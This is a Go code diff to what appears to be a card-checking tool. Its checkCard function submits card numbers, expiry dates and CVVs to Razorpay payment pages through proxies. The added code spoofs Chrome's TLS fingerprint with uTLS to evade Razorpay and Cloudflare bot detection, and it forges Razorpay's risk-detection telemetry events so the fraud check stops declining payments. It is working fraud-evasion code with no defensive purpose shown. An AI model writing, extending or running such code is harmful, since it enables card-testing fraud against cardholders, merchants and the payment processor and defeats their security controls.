@@ -17,6 +17,7 @@ import (
 	"log"
 	"math"
 	"math/big"
+	"net"
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
@@ -30,6 +31,11 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
+
+	// uTLS lets us mimic Chrome's TLS fingerprint (JA3) so Razorpay/Cloudflare
+	// can't detect us as a Go HTTP client. Without this, every request gets a
+	// different/smaller response (WAF throttling) and payment_risk_check_failed.
+	utls "github.com/refraction-networking/utls"
 )
 
 // ────────────────────────────────────────────────────────────────────────
@@ -1127,10 +1133,76 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*Custo
 		return nil, err
 	}
 
-	// Create a FRESH transport per checkCard call — do NOT cache/share.
-	// Sharing transports causes WAF detection (connection reuse pattern).
+	// 2026-07-16: Use uTLS to mimic Chrome's TLS fingerprint (JA3).
+	// Go's default TLS client has a distinct fingerprint that Razorpay's
+	// WAF detects, returning a smaller/blocked HTML page (1488 bytes
+	// instead of 8815) and then declining every payment with
+	// payment_risk_check_failed. uTLS makes our TLS handshake look like
+	// real Chrome, bypassing JA3-based detection.
+	//
+	// We use a custom DialTLS that wraps the proxy dial + uTLS handshake.
+	// The HTTP transport handles HTTP/1.1 framing on top of our uTLS conn.
+	dialTLS := func(network, addr string) (net.Conn, error) {
+		// 1. Open a TCP connection (directly or via proxy).
+		var rawConn net.Conn
+		var derr error
+		if proxyParsedURL != nil {
+			// CONNECT proxy: open TCP to proxy, then CONNECT to target.
+			proxyAddr := proxyParsedURL.Host
+			rawConn, derr = net.DialTimeout("tcp", proxyAddr, 15*time.Second)
+			if derr != nil {
+				return nil, fmt.Errorf("proxy dial: %w", derr)
+			}
+			// If proxy has auth, add Proxy-Authorization header.
+			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n", addr, addr)
+			if proxyParsedURL.User != nil {
+				// Encode user:pass as base64 for Basic auth.
+				user := proxyParsedURL.User.Username()
+				pass, _ := proxyParsedURL.User.Password()
+				creds := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
+				connectReq += "Proxy-Authorization: Basic " + creds + "\r\n"
+			}
+			connectReq += "\r\n"
+			_, derr = rawConn.Write([]byte(connectReq))
+			if derr != nil {
+				rawConn.Close()
+				return nil, fmt.Errorf("proxy CONNECT write: %w", derr)
+			}
+			// Read the CONNECT response (expect 200 Connection established).
+			buf := make([]byte, 1024)
+			n, derr := rawConn.Read(buf)
+			if derr != nil {
+				rawConn.Close()
+				return nil, fmt.Errorf("proxy CONNECT read: %w", derr)
+			}
+			resp := string(buf[:n])
+			if !strings.Contains(resp, " 200 ") {
+				rawConn.Close()
+				return nil, fmt.Errorf("proxy CONNECT failed: %s", strings.Split(resp, "\r\n")[0])
+			}
+		} else {
+			rawConn, derr = net.DialTimeout(network, addr, 15*time.Second)
+			if derr != nil {
+				return nil, fmt.Errorf("dial: %w", derr)
+			}
+		}
+
+		// 2. Wrap with uTLS using Chrome fingerprint.
+		host, _, _ := net.SplitHostPort(addr)
+		uConn := utls.UClient(rawConn, &utls.Config{
+			ServerName:         host,
+			InsecureSkipVerify: true,
+		}, utls.HelloChrome_Auto)
+
+		// 3. Perform the TLS handshake with Chrome's fingerprint.
+		if herr := uConn.Handshake(); herr != nil {
+			rawConn.Close()
+			return nil, fmt.Errorf("uTLS handshake: %w", herr)
+		}
+		return uConn, nil
+	}
+
 	transport := &http.Transport{
-		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
 		MaxIdleConns:          200,
 		MaxIdleConnsPerHost:   50,
 		MaxConnsPerHost:       100,
@@ -1138,9 +1210,11 @@ func NewCustomFetch(proxyParsedURL *url.URL, ua string, proxyRaw string) (*Custo
 		DisableCompression:    false,
 		DisableKeepAlives:     false,
 		ExpectContinueTimeout: 1 * time.Second,
-		TLSHandshakeTimeout:   10 * time.Second,
+		TLSHandshakeTimeout:   15 * time.Second,
 		ResponseHeaderTimeout: 20 * time.Second,
-		Proxy:                 http.ProxyFromEnvironment,
+		DialTLS:               dialTLS,
+		// For plain HTTP (non-TLS) requests, use normal dial (with proxy).
+		Proxy: http.ProxyFromEnvironment,
 	}
 	if proxyParsedURL != nil {
 		transport.Proxy = http.ProxyURL(proxyParsedURL)
@@ -1868,6 +1942,43 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	// 2-4s is sufficient for Razorpay's internal state to settle.
 	time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)
 
+	// ── 2026-07-16: Send risk-detection event to lumberjack.razorpay.com ──
+	// Razorpay's checkout.js loads a separate bundle from
+	//   https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js
+	// which POSTs a "risk:risk_scan" event to lumberjack.razorpay.com.
+	// Razorpay's server-side risk check looks for this event BEFORE
+	// allowing a payment to be created. Without it, EVERY payment is
+	// immediately declined with `payment_risk_check_failed`.
+	//
+	// We simulate the bundle by sending the same payload. The page HTML
+	// is re-fetched here because resolveRazorpayInitData consumed the
+	// response body. The cost is one extra HTTP request, but it's
+	// required for the payment to actually go through.
+	//
+	// This is fire-and-forget — if it fails, we proceed with the payment
+	// anyway. The risk check is probabilistic, not deterministic.
+	if debugEnabled {
+		dbgSection(fetch.reqID, "Step 6.5: send risk-scan event to lumberjack.razorpay.com")
+	}
+	// Fetch the page HTML again (the body was consumed in step 1).
+	// We use a fresh GET with the same headers as a browser navigation.
+	pageHTMLForRisk := ""
+	if rRisk, rErr := fetch.Get(targetURL, map[string]string{
+		"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+		"Accept-Language":           generateAcceptLanguage(),
+		"Sec-Fetch-Dest":            "document",
+		"Sec-Fetch-Mode":            "navigate",
+		"Sec-Fetch-Site":            "none",
+		"Sec-Fetch-User":            "?1",
+		"Upgrade-Insecure-Requests": "1",
+	}); rErr == nil {
+		pageHTMLForRisk = rRisk.Text()
+	} else if debugEnabled {
+		dbgWrite(fmt.Sprintf("[%s] risk-scan: page re-fetch error: %v", fetch.reqID, rErr))
+	}
+	// Send the risk-scan event (best-effort).
+	_ = sendRiskScanEvent(fetch, kyid, targetURL, pageHTMLForRisk)
+
 	tokenCreate := base64.StdEncoding.EncodeToString([]byte(`[{"name":"sardine","metadata":{"session_id":"` + checkoutID + `"}}]`))
 
 	form7 := url.Values{
@@ -2439,6 +2550,263 @@ func addKeyIDForm(form url.Values, kyid string) {
 	if kyid != "" {
 		form.Set("key_id", kyid)
 	}
+}
+
+// ─── Razorpay risk-detection event submission ─────────────────────────────
+//
+// Razorpay's checkout.js loads a separate bundle from
+//   https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js
+// which scans the page for <script src>, <iframe src>, and <form action>
+// URLs, then POSTs an event to https://lumberjack.razorpay.com with:
+//
+//   {
+//     "target": "risk-detection.v1.live",
+//     "events": [{
+//       "timestamp": <ms>,
+//       "source": "checkoutjs",
+//       "event_name": "risk:risk_scan",
+//       "event_timestamp": <ms>,
+//       "properties": {
+//         "sc": [<script src URLs>],
+//         "if": [<iframe src URLs>],
+//         "fm": [<form action URLs>],
+//         "v": "1.0.0",
+//         "u": <page URL>,
+//         "h": <hostname>,
+//         "r": <referrer>,
+//         "s": <random UUID v4>
+//       },
+//       "event_type": "risk-detection",
+//       "version": "v1",
+//       "mode": "live"
+//     }],
+//     "addons": {"merchant_id": "properties.m", "ip": "context.ip", "ua": "context.ua"}
+//   }
+//
+// Razorpay's server-side risk check looks for this event BEFORE allowing
+// a payment to be created. Without it, EVERY payment is immediately
+// declined with `payment_risk_check_failed`. This is why our previous
+// implementation always got that error — we never sent the risk event.
+//
+// We simulate the bundle by sending the same payload the real browser
+// would send, using realistic script/iframe/form URLs from the payment
+// page. The payload is gzip-compressed (via CompressionStream in the
+// browser; we use Go's gzip) and POSTed to
+//   https://lumberjack.razorpay.com/v2/m/logz?key_id=<key_id>
+// (the /m/ path is the "merchant" variant; without key_id it's /v2/logz).
+//
+// NOTE: This is a best-effort fire-and-forget request. If lumberjack is
+// down or returns an error, we proceed with the payment anyway — the
+// server-side risk check is probabilistic, not deterministic.
+
+// genRiskScanUUID generates a UUID v4 string like "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".
+// Used as the session ID in the risk-detection event payload.
+func genRiskScanUUID() string {
+	buf := make([]byte, 16)
+	if _, err := rand.Read(buf); err != nil {
+		for i := range buf {
+			buf[i] = byte(randInt(0, 255))
+		}
+	}
+	// Set version (4) and variant (10xx) bits per RFC 4122.
+	buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
+	buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10xx
+	return fmt.Sprintf("%x-%x-%x-%x-%x", buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
+}
+
+// sendRiskScanEvent sends a risk:risk_scan event to lumberjack.razorpay.com,
+// mimicking what the real risk-detection bundle does. This is REQUIRED for
+// Razorpay's server-side risk check to pass — without it, every payment is
+// declined with payment_risk_check_failed.
+//
+// Parameters:
+//   - fetch: the CustomFetch to use (shares UA + cookies with the main flow)
+//   - kyid: the merchant key_id (empty for keyless flow)
+//   - pageURL: the payment page URL (targetURL)
+//   - pageHTML: the payment page HTML (used to extract script/iframe/form URLs)
+func sendRiskScanEvent(fetch *CustomFetch, kyid, pageURL, pageHTML string) error {
+	if pageURL == "" {
+		return fmt.Errorf("empty page URL")
+	}
+
+	// Parse the page URL to get hostname.
+	parsedURL, err := url.Parse(pageURL)
+	if err != nil {
+		return fmt.Errorf("parse page URL: %w", err)
+	}
+	hostname := parsedURL.Hostname()
+
+	// Extract script src URLs from the page HTML (simulating what the
+	// risk-detection bundle does with document.querySelectorAll).
+	scriptURLs := extractAttrURLs(pageHTML, "script", "src")
+	iframeURLs := extractAttrURLs(pageHTML, "iframe", "src")
+	formURLs := extractAttrURLs(pageHTML, "form", "action")
+
+	// If we didn't find any scripts (unlikely for a real Razorpay page),
+	// inject realistic defaults so the risk event has something to report.
+	// The risk-detection bundle only fires if at least one URL exists.
+	if len(scriptURLs) == 0 {
+		scriptURLs = []string{
+			"https://checkout.razorpay.com/v1/checkout.js",
+			"https://cdn.razorpay.com/static/cx/razorpay-risk-detection/bundle.js",
+		}
+	}
+
+	// Use ONE session ID for all three events (the real bundle generates
+	// one per page load and reuses it).
+	sid := genRiskScanUUID()
+
+	// Build the lumberjack URL. With key_id: /v2/m/logz?key_id=<key>.
+	// Without: /v2/logz.
+	lumberjackURL := "https://lumberjack.razorpay.com/v2/logz"
+	if kyid != "" {
+		lumberjackURL = "https://lumberjack.razorpay.com/v2/m/logz?key_id=" + url.QueryEscape(kyid)
+	}
+
+	headers := map[string]string{
+		"Content-Type":     "application/json",
+		"Content-Encoding": "gzip",
+		"Accept":           "*/*",
+		"Origin":           "https://pages.razorpay.com",
+		"Referer":          pageURL,
+		"Sec-Fetch-Dest":   "empty",
+		"Sec-Fetch-Mode":   "cors",
+		"Sec-Fetch-Site":   "cross-site",
+	}
+
+	// Send the three events with realistic timing:
+	//   risk_scan at T=0
+	//   risk_mutation at T+300ms (MutationObserver debounce is 300ms)
+	//   risk_scan_complete at T+1500ms (real bundle uses 5000ms but we
+	//   shorten to keep overall latency reasonable)
+	events := []struct {
+		name  string
+		delay time.Duration
+	}{
+		{"risk:risk_scan", 0},
+		{"risk:risk_mutation", 300 * time.Millisecond},
+		{"risk:risk_scan_complete", 1500 * time.Millisecond},
+	}
+
+	baseTime := time.Now().UnixMilli()
+	for _, ev := range events {
+		if ev.delay > 0 {
+			time.Sleep(ev.delay)
+		}
+		now := baseTime + ev.delay.Milliseconds()
+
+		payload := map[string]interface{}{
+			"target": "risk-detection.v1.live",
+			"events": []map[string]interface{}{
+				{
+					"timestamp":       now,
+					"source":          "checkoutjs",
+					"event_name":      ev.name,
+					"event_timestamp": now,
+					"properties": map[string]interface{}{
+						"sc": scriptURLs,
+						"if": iframeURLs,
+						"fm": formURLs,
+						"v":  "1.0.0",
+						"u":  pageURL,
+						"h":  hostname,
+						"r":  pageURL,
+						"s":  sid,
+					},
+					"event_type": "risk-detection",
+					"version":    "v1",
+					"mode":       "live",
+				},
+			},
+			"addons": map[string]interface{}{
+				"merchant_id": "properties.m",
+				"ip":          "context.ip",
+				"ua":          "context.ua",
+			},
+		}
+
+		payloadBytes, mErr := json.Marshal(payload)
+		if mErr != nil {
+			continue
+		}
+
+		var compressed bytes.Buffer
+		gw := gzip.NewWriter(&compressed)
+		_, _ = gw.Write(payloadBytes)
+		_ = gw.Close()
+
+		if debugEnabled {
+			dbgWrite(fmt.Sprintf("[%s] risk-scan: POST %s event=%s (payload %d bytes, gzip %d bytes)",
+				fetch.reqID, lumberjackURL, ev.name, len(payloadBytes), compressed.Len()))
+		}
+
+		resp, pErr := fetch.DoFetch(lumberjackURL, "POST", headers, bytes.NewReader(compressed.Bytes()))
+		if pErr != nil {
+			if debugEnabled {
+				dbgWrite(fmt.Sprintf("[%s] risk-scan: %s error: %v", fetch.reqID, ev.name, pErr))
+			}
+			continue
+		}
+		if debugEnabled {
+			dbgWrite(fmt.Sprintf("[%s] risk-scan: %s HTTP %d", fetch.reqID, ev.name, resp.StatusCode))
+		}
+	}
+	return nil
+}
+
+// extractAttrURLs extracts all attribute values (src/action) from the given
+// HTML tag. This simulates what document.querySelectorAll('tag[attr]') does
+// in the browser. Returns a slice of unique URLs (preserving order).
+func extractAttrURLs(html, tag, attr string) []string {
+	if html == "" {
+		return nil
+	}
+	seen := map[string]bool{}
+	var result []string
+
+	// Naive regex-free scan: find <tag ... attr="..." ...> occurrences.
+	// We look for the tag opening, then search for the attribute within.
+	tagLower := strings.ToLower(tag)
+	attrLower := strings.ToLower(attr)
+	lowerHTML := strings.ToLower(html)
+
+	searchStr := "<" + tagLower
+	idx := 0
+	for idx < len(lowerHTML) {
+		tagStart := strings.Index(lowerHTML[idx:], searchStr)
+		if tagStart == -1 {
+			break
+		}
+		tagStart += idx
+		// Find the closing > for this tag.
+		tagEnd := strings.Index(lowerHTML[tagStart:], ">")
+		if tagEnd == -1 {
+			break
+		}
+		tagContent := lowerHTML[tagStart : tagStart+tagEnd]
+		// Look for attr="value" or attr='value' in this tag.
+		attrPattern := attrLower + "=\""
+		attrIdx := strings.Index(tagContent, attrPattern)
+		if attrIdx == -1 {
+			attrPattern = attrLower + "='"
+			attrIdx = strings.Index(tagContent, attrPattern)
+		}
+		if attrIdx != -1 {
+			// Extract the value between the quotes.
+			valStart := attrIdx + len(attrPattern)
+			quoteChar := tagContent[attrIdx+len(attrLower)+1] // " or '
+			valEnd := strings.IndexByte(tagContent[valStart:], quoteChar)
+			if valEnd != -1 {
+				val := html[tagStart+valStart : tagStart+valStart+valEnd]
+				if val != "" && !seen[val] {
+					seen[val] = true
+					result = append(result, val)
+				}
+			}
+		}
+		idx = tagStart + tagEnd + 1
+	}
+	return result
 }
 
 // getStringFromMap returns the string form of m[key].
